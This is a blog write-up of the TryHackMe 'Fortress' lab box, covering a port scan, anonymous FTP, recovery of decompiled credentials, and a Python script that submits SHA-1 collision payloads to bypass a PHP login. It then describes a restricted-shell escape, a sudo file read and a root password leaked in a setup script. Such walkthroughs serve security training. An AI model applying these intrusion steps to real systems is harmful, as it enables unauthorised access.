---
layout: post
title: TryHackMe - Fortress
---

![](/assets/2021-09-05-07-46-46.png)

I was initially going to carry on with studying for OSED this weekend, but on Friday evening I saw a message come through that a new machine for TryHackMe had been released.  There aren't that many hard boxes that comes through, so I was intrigued enough to give it a go.

The room is called Fortress, and is available at [https://tryhackme.com/room/fortress](https://tryhackme.com/room/fortress).

### Portscan

The first thing I did was a portscan:

```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f:d0:bb:c7:e2:ee:7f:91:fe:c2:6a:a6:bb:b2:e1:91 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCXx2nOQ7SVuA1liJqX+ZR2KK9Oipy+1cd4ZZ3iD+/xuAkvon338WPfjcGmNaBd0McHqunhvl1xJZZMsOsjVuMUSD0GUX3YF6BQ/RdVxQ00/gRvVW70nUk+kf+Umz/5HbI9IfBLoIcRGWxf3naUdl8Vfs7Fj38fnZB0A+8av3/VAthEhiOq58o9ssQJ7DD6ZJydt4R1G9WYa2C+8O76/rJ9EadLCaNAeKKUYmuGEdJit+vGsd4ggzYc0qJQ2QmRUrVK+FeIFZDIo4InaPIiI1VF0X+ooax1siytlF85f5956EfDsGgzNBZb/9I5tGz4QFnM/FH65fXEnvUrDoXO2+dj
|   256 06:4b:fe:c0:6e:e4:f4:7e:e1:db:1c:e7:79:9d:2b:1d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPBJBTN55zS77xduARAxZeA+xhJt04e3yVZpkmTObu2JMOjxTzFoK4mftWUdLsx1bs1mDIWWXLOKjXcnq3PcO84=
|   256 0d:0e:ce:57:00:1a:e2:8d:d2:1b:2e:6d:92:3e:65:c4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJezjvXtsHInz+XQ4hYfNBX5kjinTpiKRYaK5rF1og71
5581/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp           305 Jul 25 20:06 marked.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.156.208
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
5752/tcp open  unknown syn-ack ttl 63
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest: 
|     Chapter 1: A Call for help
|     Username: Password:
|   NULL, RPCCheck, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     Chapter 1: A Call for help
|_    Username:
7331/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5752-TCP:V=7.91%I=7%D=9/4%Time=6132E91F%P=x86_64-pc-linux-gnu%r(NUL
SF:L,28,"\n\tChapter\x201:\x20A\x20Call\x20for\x20help\n\nUsername:\x20")%
SF:r(GenericLines,32,"\n\tChapter\x201:\x20A\x20Call\x20for\x20help\n\nUse
SF:rname:\x20Password:\x20")%r(GetRequest,32,"\n\tChapter\x201:\x20A\x20Ca
SF:ll\x20for\x20help\n\nUsername:\x20Password:\x20")%r(HTTPOptions,32,"\n\
SF:tChapter\x201:\x20A\x20Call\x20for\x20help\n\nUsername:\x20Password:\x2
SF:0")%r(RTSPRequest,32,"\n\tChapter\x201:\x20A\x20Call\x20for\x20help\n\n
SF:Username:\x20Password:\x20")%r(RPCCheck,28,"\n\tChapter\x201:\x20A\x20C
SF:all\x20for\x20help\n\nUsername:\x20")%r(DNSVersionBindReqTCP,32,"\n\tCh
SF:apter\x201:\x20A\x20Call\x20for\x20help\n\nUsername:\x20Password:\x20")
SF:%r(DNSStatusRequestTCP,32,"\n\tChapter\x201:\x20A\x20Call\x20for\x20hel
SF:p\n\nUsername:\x20Password:\x20")%r(Help,32,"\n\tChapter\x201:\x20A\x20
SF:Call\x20for\x20help\n\nUsername:\x20Password:\x20")%r(SSLSessionReq,28,
SF:"\n\tChapter\x201:\x20A\x20Call\x20for\x20help\n\nUsername:\x20")%r(Ter
SF:minalServerCookie,28,"\n\tChapter\x201:\x20A\x20Call\x20for\x20help\n\n
SF:Username:\x20")%r(TLSSessionReq,28,"\n\tChapter\x201:\x20A\x20Call\x20f
SF:or\x20help\n\nUsername:\x20");
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
```

#### FTP - Port 5581

The first thing that stood out was that we had anonymous access to an FTP server.  

Once you're logged in, you have access to two files, so I downloaded them.

![](/assets/2021-09-05-07-10-39.png)

The first is a message that gives you a clue to what you're going to be finding on this FTP server.  It also gives you a username.

![](/assets/2021-09-05-07-11-20.png)

The second turned out to be a compiled `python` file.

![](/assets/2021-09-05-07-11-46.png)

I used `uncompyle6` to decompile the file to it's original python code.  From here I can see this is most likely the code that is running for the service on port 5752, and it expects you to enter a username and password.  Lucky enough for us, the username and password are hardcoded, albeit encoded.

![](/assets/2021-09-05-07-12-12.png)

I put together a small python script that would allow me to decode the credentials that the service is expecting.

![](/assets/2021-09-05-07-14-37.png)

![](/assets/2021-09-05-07-14-42.png)

#### Custom service - Port 5752

Using the credentials obtained on port 5752, I am able to obtain a key of sorts.

![](/assets/2021-09-05-07-15-33.png)

#### HTTP - Port 7331

The only other thing left to explore is the HTTP service running on port 7331.  

The front page was just the default Apache2 HTML.

![](/assets/2021-09-05-07-17-35.png)

I spent quite a bit of time trying various combinations of fuzzing (directories/files/virtualhosts), and banging my head against the desk trying to figure out what to do next.

I found a `/private.php`, and spent a lot of time fuzzing for parameters to see if anything would pop.  But I could find nothing.

![](/assets/2021-09-05-07-18-27.png)

I had found `/assets/style.css` which had a base64 encoded message.

![](/assets/2021-09-05-07-19-05.png)

![](/assets/2021-09-05-07-19-09.png)

Reading the message, I was quite certain whatever next steps need to be taken, would involve hash collisions.

Eventually I decided to look at the key I had obtained, and tried it as part of a filename for a URL.  I finally found something.

![](/assets/2021-09-05-07-20-40.png)

After trying the username and password combination I had, I kept failing.

Then I decided to try something else, which luckily worked.

![](/assets/2021-09-05-07-21-49.png)

Now that I had access to the PHP code behind the file, I had something to work with.

This section showed me that I was right in my assumption that we're going to deal with hash collisions.  There is a well known research paper available at [https://shattered.io/](https://shattered.io/)  

![](/assets/2021-09-05-07-22-41.png)

The only problem with using the PDFs that they provide, is an extra check in this piece of code that makes sure you dont have 3 sequential null bytes in the provided parameters.

![](/assets/2021-09-05-07-24-44.png)

![](/assets/2021-09-05-07-24-32.png)

This led me down a path of researching SHA1 collisions, and what possible ways there were to generate them.

Eventually I came across this great writeup, [https://github.com/bl4de/ctf/blob/master/2017/BostonKeyParty_2017/Prudentialv2/Prudentialv2_Cloud_50.md](https://github.com/bl4de/ctf/blob/master/2017/BostonKeyParty_2017/Prudentialv2/Prudentialv2_Cloud_50.md)

Using the research they had done, I was able to create a python script that successfully matched all the criteria to obtain the `$spot` variable.

```python
import requests

username = '255044462D312E33 0A25E2E3 CFD30A0A 0A312030 206F626A 0A3C3C2F 57696474 68203220 3020522F 48656967 68742033 20302052 2F547970 65203420 3020522F 53756274 79706520 35203020 522F4669 6C746572 20362030 20522F43 6F6C6F72 53706163 65203720 3020522F 4C656E67 74682038 20302052 2F426974 73506572 436F6D70 6F6E656E 7420383E 3E0A7374 7265616D 0AFFD8FF FE002453 48412D31 20697320 64656164 21212121 21852FEC 09233975 9C39B1A1 C63C4C97 E1FFFE01 7F46DC93 A6B67E01 3B029AAA 1DB2560B 45CA67D6 88C7F84B 8C4C791F E02B3DF6 14F86DB1 690901C5 6B45C153 0AFEDFB7 6038E972 722FE7AD 728F0E49 04E046C2 30570FE9 D41398AB E12EF5BC 942BE335 42A4802D 98B5D70F 2A332EC3 7FAC3514 E74DDC0F 2CC1A874 CD0C7830 5A215664 61309789 606BD0BF 3F98CDA8 044629A1 3C68746D 6C3E0A3C 73637269 7074206C 616E6775 6167653D 6A617661 73637269 70742074 7970653D 22746578 742F6A61 76617363 72697074 223E0A3C 212D2D20 40617277 202D2D3E 0A0A7661 72206820 3D20646F 63756D65 6E742E67 6574456C 656D656E 74734279 5461674E 616D6528 2248544D 4C22295B 305D2E69 6E6E6572 48544D4C 2E636861 72436F64 65417428 31303229 2E746F53 7472696E 67283136 293B0A69 66202868 203D3D20 27373327 29207B0A 20202020 646F6375 6D656E74 2E626F64 792E696E 6E657248 544D4C20 3D20223C 5354594C 453E626F 64797B62 61636B67 726F756E 642D636F 6C6F723A 5245443B 7D206831 7B666F6E 742D7369 7A653A35 3030253B 7D3C2F53 54594C45 3E3C4831 3E262378 31663634 383B3C2F 48313E22 3B0A7D20 656C7365 207B0A20 20202064 6F63756D 656E742E 626F6479 2E696E6E 65724854 4D4C203D 20223C53 54594C45 3E626F64 797B6261 636B6772 6F756E64 2D636F6C 6F723A42 4C55453B 7D206831 7B666F6E 742D7369 7A653A35 3030253B 7D3C2F53 54594C45 3E3C4831 3E262378 31663634 393B3C2F 48313E22 3B0A7D0A 0A3C2F73 63726970 743E0A0A'
password = '25504446 2D312E33 0A25E2E3 CFD30A0A 0A312030 206F626A 0A3C3C2F 57696474 68203220 3020522F 48656967 68742033 20302052 2F547970 65203420 3020522F 53756274 79706520 35203020 522F4669 6C746572 20362030 20522F43 6F6C6F72 53706163 65203720 3020522F 4C656E67 74682038 20302052 2F426974 73506572 436F6D70 6F6E656E 7420383E 3E0A7374 7265616D 0AFFD8FF FE002453 48412D31 20697320 64656164 21212121 21852FEC 09233975 9C39B1A1 C63C4C97 E1FFFE01 7346DC91 66B67E11 8F029AB6 21B2560F F9CA67CC A8C7F85B A84C7903 0C2B3DE2 18F86DB3 A90901D5 DF45C14F 26FEDFB3 DC38E96A C22FE7BD 728F0E45 BCE046D2 3C570FEB 141398BB 552EF5A0 A82BE331 FEA48037 B8B5D71F 0E332EDF 93AC3500 EB4DDC0D ECC1A864 790C782C 76215660 DD309791 D06BD0AF 3F98CDA4 BC4629B1 3C68746D 6C3E0A3C 73637269 7074206C 616E6775 6167653D 6A617661 73637269 70742074 7970653D 22746578 742F6A61 76617363 72697074 223E0A3C 212D2D20 40617277 202D2D3E 0A0A7661 72206820 3D20646F 63756D65 6E742E67 6574456C 656D656E 74734279 5461674E 616D6528 2248544D 4C22295B 305D2E69 6E6E6572 48544D4C 2E636861 72436F64 65417428 31303229 2E746F53 7472696E 67283136 293B0A69 66202868 203D3D20 27373327 29207B0A 20202020 646F6375 6D656E74 2E626F64 792E696E 6E657248 544D4C20 3D20223C 5354594C 453E626F 64797B62 61636B67 726F756E 642D636F 6C6F723A 5245443B 7D206831 7B666F6E 742D7369 7A653A35 3030253B 7D3C2F53 54594C45 3E3C4831 3E262378 31663634 383B3C2F 48313E22 3B0A7D20 656C7365 207B0A20 20202064 6F63756D 656E742E 626F6479 2E696E6E 65724854 4D4C203D 20223C53 54594C45 3E626F64 797B6261 636B6772 6F756E64 2D636F6C 6F723A42 4C55453B 7D206831 7B666F6E 742D7369 7A653A35 3030253B 7D3C2F53 54594C45 3E3C4831 3E262378 31663634 393B3C2F 48313E22 3B0A7D0A 0A3C2F73 63726970 743E0A0A'

username = ''.join(username.split(' '))
password = ''.join(password.split(' '))

usernamestr = ''.join(['%' + username[i] + username[i + 1] for i in range(0, len(username)) if i % 2 == 0])
passwordstr = ''.join(['%' + password[i] + password[i + 1] for i in range(0, len(password)) if i % 2 == 0])

response = requests.get('http://fortress:7331/t3mple_0f_y0ur_51n5.php?user={}&pass={}'.format(usernamestr, passwordstr), proxies={'http':'http://localhost:8080'})

print(response.text)
```

Running the script and getting the HTML response, we get more information.

![](/assets/2021-09-05-07-32-22.png)

This text file gives us access to an SSH private key.

![](/assets/2021-09-05-07-33-10.png)

#### SSH - Port 22

Making use of the private key, I am able to SSH in as `h4rdy`.

![](/assets/2021-09-05-07-34-06.png)

We are however dropped into a restricted shell, and can pretty much not do anything.

I SSH back in, using extra parameters to try and bypass this restriction, and it works.

![](/assets/2021-09-05-07-34-55.png)

After adjusting the PATH environmental variable, I am able to explore more.

![](/assets/2021-09-05-07-35-52.png)

#### Privilege Escalation

Looking at sudo, I'm able to determine I can cat files as the user `j4x0n`.

![](/assets/2021-09-05-07-36-53.png)

I make use of this to get his SSH private key.

I also make use of this to read the `user.txt` file.

![](/assets/2021-09-05-07-38-18.png)

Once I have it copied locally, I SSH in as `j4x0n`.

![](/assets/2021-09-05-07-37-22.png)

#### Final Privilege Escalation

This step was a bit disappointing, after all this hard work to get onto the machine.  While linpeas was running, I start manually exploring.

I find a rabbit hole located in the /opt folder, but immediately after that notice the /data directory.

In here we have a setup.sh file, that is used to set up the machine each time it is spun up.

I can find the flags, and the root password in here.

![](/assets/2021-09-05-07-39-41.png)

![](/assets/2021-09-05-07-39-51.png)

#### Profit

![](/assets/2021-09-05-07-40-13.png)